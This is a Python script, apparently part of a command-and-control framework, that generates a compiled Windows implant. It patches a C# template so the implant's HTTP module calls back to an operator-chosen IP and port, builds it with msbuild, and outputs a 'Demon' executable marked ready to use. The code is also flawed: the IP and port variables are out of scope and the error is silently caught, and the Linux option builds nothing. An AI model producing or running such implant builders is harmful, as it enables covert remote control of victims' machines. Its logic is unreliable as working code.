import os
import shutil
import subprocess
from datetime import datetime

from colorama import Fore

import Internals.Folder_Architecture
import Internals.Zip_Extractor
import Utilities.constant as const

implant_path_template = "Resources\\ImplantTemplate.txt"
implant_path_project = "Resources\\Implant\\"
implant_release_path = "Implants\\"
implant_main_program = "Resources\\Implant\\Program.cs"

current_path = os.getcwd()


def clear_previous_template():
    if os.path.exists(implant_path_template):
        os.remove(implant_path_template)

    else:
        pass


def replace_file():
    if os.path.exists(implant_path_template):
        os.remove(implant_main_program)
        shutil.move(implant_path_template, implant_main_program)


def replace_value():
    logfile = open(implant_main_program, 'r')
    fout = open(implant_path_template, 'w+')

    loglist = logfile.readlines()
    logfile.close()

    for line in loglist:
        rep = line.replace('_commModule = new HttpCommModule("localhost", 8080);',
                           '_commModule = new HttpCommModule("%s", %s);' % (ip, port))
        fout.writelines(rep)

    fout.close()


def compilation(system):
    if system == "windows" or system == "assembly":
        const.information_message("Start Compilation")
        os.chdir(implant_path_project)

        msbuild = subprocess.run(
            "msbuild -t:build -p:Configuration=Release -p:OutputPath=.\\ -verbosity:quiet",
            capture_output=True)

        os.chdir(current_path)

        if os.path.exists(implant_path_project + "\\" + "Implant.exe"):
            now = datetime.now()
            dt_string = now.strftime("%Y%m%d-%H%M%S")
            implant_dest = "Implants\\Demon_" + dt_string + ".exe"

            shutil.move(implant_path_project + "\\Implant.exe", implant_dest)

            if os.path.exists(implant_dest):
                const.success_message("Compilation Success")
                if system == "assembly":
                    pass
                else:
                    const.success_message("Implant Ready To Use: " + implant_dest)
                Internals.Folder_Architecture.delete_implant_folder()

        else:
            const.error_message("Error: Unexpected Error During Compilation")
            Internals.Folder_Architecture.delete_implant_folder()


def main(system, ip, port):
    clear_previous_template()
    Internals.Zip_Extractor.unzip()

    try:
        replace_value()
        replace_file()

        if system == "windows":
            # arch = Services.Implant_Generation.Architecture.select_windows_arch()
            compilation(system)

        elif system == "linux":
            # arch = Services.Implant_Generation.Architecture.select_linux_arch()
            compilation(system)

        elif system == "assembly":
            compilation(system)

        else:
            Internals.Folder_Architecture.delete_implant_folder()

    except Exception as e:
        Internals.Folder_Architecture.delete_implant_folder()
